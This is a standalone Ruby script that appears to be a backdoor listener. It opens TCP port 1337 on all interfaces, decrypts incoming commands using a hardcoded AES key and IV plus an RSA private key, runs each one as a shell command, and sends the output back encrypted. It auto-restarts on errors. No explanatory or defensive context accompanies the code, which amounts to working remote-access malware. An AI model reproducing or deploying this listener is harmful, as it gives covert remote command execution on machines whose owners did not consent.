require 'openssl'
require 'socket'

def aes_encrypt(data, key, iv)
  cipher = OpenSSL::Cipher.new('aes-256-cbc')
  cipher.encrypt
  cipher.key = key
  cipher.iv = iv

  encrypted = cipher.update(data) + cipher.final

  return encrypted
end
def aes_decrypt(data, key, iv)
  cipher = OpenSSL::Cipher.new('aes-256-cbc')
  cipher.decrypt
  cipher.key = key
  cipher.iv = iv

  decrypted = cipher.update(data) + cipher.final

  return decrypted
end


def start_listener
  listener_private_key = OpenSSL::PKey::RSA.new(File.read('listener_private_key.pem'))
  server_public_key = OpenSSL::PKey::RSA.new(File.read('server_public_key.pem'))

  aes_key = '12345678901234567890123456789012'
  aes_iv = '0123456789abcdef'

  loop do
    begin
      server = TCPServer.new('0.0.0.0', 1337)
      puts "Listener started and waiting for connections..."

      loop do
        client = server.accept
        puts "Client connected"

        loop do
          encrypted_command = client.gets("\n\n").strip
          first_decrypt = aes_decrypt(encrypted_command, aes_key, aes_iv)
          decrypted_command = listener_private_key.private_decrypt(first_decrypt)
          #puts "Received encrypted command: #{encrypted_command}"
          #puts "Decrypted command: #{decrypted_command}"

          if decrypted_command == "exit"
            client.puts "Goodbye!"
            client.flush
            client.close
            puts "Client disconnected"
            break
          end

          encrypted_command = aes_encrypt(decrypted_command, aes_key, aes_iv)

          response = `#{decrypted_command}`
          puts "Response: #{response}"

          encrypted_response = aes_encrypt(response, aes_key, aes_iv)
          client.puts encrypted_response
          client.puts
          client.flush
          puts "Response sent"
        end
      end
    rescue StandardError => e
      puts "An error occurred: #{e.message}"
      puts "Restarting the application..."
      sleep 5 # Add a delay before restarting to avoid continuous restarts
    ensure
      server.close if server
    end
  end
end

start_listener
